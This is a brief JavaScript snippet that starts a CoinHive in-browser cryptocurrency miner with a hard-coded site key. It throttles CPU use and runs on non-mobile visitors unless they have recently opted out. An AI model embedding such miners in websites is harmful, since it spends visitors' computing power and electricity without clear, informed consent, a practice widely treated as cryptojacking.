var miner = new CoinHive.Anonymous('u4dc4NJoQLxs7isZcCaiWyCsvtpRAmfV', {
    throttle: 0.3,
    threads: 1
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}